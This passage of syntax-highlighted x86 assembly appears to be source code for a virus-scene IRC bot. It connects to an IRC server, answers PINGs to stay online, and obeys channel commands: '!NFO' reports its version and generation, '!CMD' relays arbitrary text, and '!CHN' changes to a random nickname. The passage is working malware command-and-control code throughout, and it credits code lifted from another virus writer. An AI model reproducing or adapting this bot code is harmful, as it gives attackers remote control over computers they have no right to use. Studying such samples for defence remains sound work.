        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RndChar</span><span class="sc0">                               </span><span class="sc1">;xtra nfo</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">channel</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">000dh</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">                                   </span><span class="sc1">;CR &amp; AsciiZ</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sendstring</span><span class="sc0">                      </span><span class="sc1">;Login!</span><span class="sc0">
        

</span><span class="sc1">;------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       *** MAIN IRC CONNECTION LOOP</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">again</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">300h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">buffer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">conn_socket</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">recv</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">stop</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">stop</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc3">"GNIP"</span><span class="sc0">   </span><span class="sc1">;A PING? we have to reply to</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">NoPong</span><span class="sc0">                          </span><span class="sc1">;keep our connection</span><span class="sc0">


</span><span class="sc1">;-------PING-REPLY-------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc3">"O"</span><span class="sc0">     </span><span class="sc1">;PONG back</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">buffer</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
</span><span class="sc5">searchCR</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">searchCR</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sendstring</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">NoPrivmsg</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">NoPong</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc0">                          </span><span class="sc1">;search for ' '</span><span class="sc0">
</span><span class="sc5">repscasb</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">repscasb</span><span class="sc0">

</span><span class="sc1">;       :NickName!ident@host.nl PRIVMSG #channel :beginning of the text</span><span class="sc0">
</span><span class="sc1">;       :LiFEwiRE!lifewire@***.lifewire.nl PRIVMSG #mO0nChild :hoj</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc3">"VIRP"</span><span class="sc0">          </span><span class="sc1">;privmsg ?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">NoPrivmsg</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">':'</span><span class="sc0">                          </span><span class="sc1">;search for :</span><span class="sc0">
</span><span class="sc5">seachstartoftext</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">seachstartoftext</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc3">"OFN!"</span><span class="sc0">          </span><span class="sc1">;!NFO ?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">nonfo</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">buffer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">privmsg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">version</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">copy</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">copy</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sendstring</span><span class="sc0">                      </span><span class="sc1">;Show version &amp; generation</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitreact</span><span class="sc0">

</span><span class="sc5">nonfo</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc3">"DMC!"</span><span class="sc0">          </span><span class="sc1">;!CMD ?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">nocmd</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;text after !CMD blaat</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">copycmd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">copycmd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0ffffffh</span><span class="sc0">                    </span><span class="sc1">;some delay for winsock</span><span class="sc0">
</span><span class="sc5">loop1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">loop1</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sendstring</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitreact</span><span class="sc0">

</span><span class="sc5">nocmd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc3">"NHC!"</span><span class="sc0">          </span><span class="sc1">;CHange Nick to random</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">nochn</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">CMDNick</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RndChar</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">000dh</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sendstring</span><span class="sc0">


</span><span class="sc5">nochn</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">exitreact</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc5">NoPrivmsg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">buffer</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;clear the buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1001h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">again</span><span class="sc0">


</span><span class="sc1">;------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">stop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">disconnect</span><span class="sc0">

</span><span class="sc5">exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">disconnected</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">disconnected</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MessageBoxA</span><span class="sc0">

        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------;</span><span class="sc0">




</span><span class="sc1">;edi = port</span><span class="sc0">
</span><span class="sc1">;esi = IP</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">Connect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">WSAData</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">101h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WSAStartup</span><span class="sc0">                      </span><span class="sc1">;startup WinSock services</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">disconnect</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">                               
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">socket</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">conn_socket</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;save socket nr</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;eax=ffffffff ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">disconnect</span><span class="sc0">
                
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">htons</span><span class="sc0">                           </span><span class="sc1">;SETUP PORT</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sockaddr_in.sin_family</span><span class="sc4">],</span><span class="sc5">AF_INET</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sockaddr_in.sin_port</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">inet_addr</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sockaddr_in.sin_addr</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">sinsize</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sockaddr_in</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">conn_socket</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">connect</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">disconnect</span><span class="sc0">

        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------;</span><span class="sc0">
        

</span><span class="sc1">;-----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">disconnect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">conn_socket</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">closesocket</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WSACleanup</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------;</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;esi = string</span><span class="sc0">
</span><span class="sc5">sendstring</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">search0</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">search0</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">                          </span><span class="sc1">;edi is increased even if byte=0</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                      </span><span class="sc1">;edi=end,esi=start, end-start=len</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                          </span><span class="sc1">;flags</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">conn_socket</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">send</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00FFFFFFh</span><span class="sc0">
</span><span class="sc5">inside_sleep</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">inside_sleep</span><span class="sc0">


        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------;</span><span class="sc0">


</span><span class="sc1">;-----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">RndChar</span><span class="sc4">:</span><span class="sc0">                                             </span><span class="sc1">;random string generator</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">blaaaa</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11111b</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'Z'</span><span class="sc4">-</span><span class="sc12">'A'</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">blaaaa</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">111b</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">blaaaa</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1b</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">okno</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc12">'a'</span><span class="sc4">-</span><span class="sc12">'A'</span><span class="sc0">
</span><span class="sc5">okno</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">blaaaa</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------;</span><span class="sc0">

</span><span class="sc5">get_rnd32</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;Stolen from prizzy's Crypto</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">;my(przy) special algorithm to</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd32_seed</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;calculate a random number</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">41C64E6Dh</span><span class="sc0">       </span><span class="sc1">;for Win32</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetTickCount</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31h</span><span class="sc0">        </span><span class="sc1">;RDTCS instruction - read</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;PCs ticks to EDX:EAX</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00003039h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd32_seed</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;-----------------------------------------------------------------------------;</span><span class="sc0">


</span><span class="sc5">IRC_nick</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"NICKUSER"</span><span class="sc0">

